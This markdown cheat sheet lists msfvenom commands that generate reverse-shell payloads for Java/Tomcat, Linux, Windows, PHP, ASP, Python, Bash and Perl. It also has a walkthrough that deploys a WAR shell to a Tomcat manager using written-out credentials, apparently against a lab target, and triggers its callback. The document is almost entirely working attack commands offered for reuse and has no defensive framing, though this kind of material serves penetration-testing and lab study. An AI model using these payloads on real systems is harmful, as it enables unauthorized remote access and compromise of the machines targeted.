# MSF Venom

## Reverse Shells

### Tomcat / WAR shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=1234 -f war > shell.war

# upload the .war file using text-based tomcat manager
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/my-shell

# check if our application is deployed
curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list

# trigger shell by curling
curl http://10.10.10.194:8080/my-shell
```

### JSP Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
```

### Linux Meterpreter reverse shell x86 multi-stage
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

### Python Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
```

### Bash Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
```

### Perl Shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
```

### ASP Meterpreter Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
```

### PHP Shell
```
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
```

### Windows CMD Multi Stage
```
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

### Windows CMD Single Stage
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

### Windows Meterpreter Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```
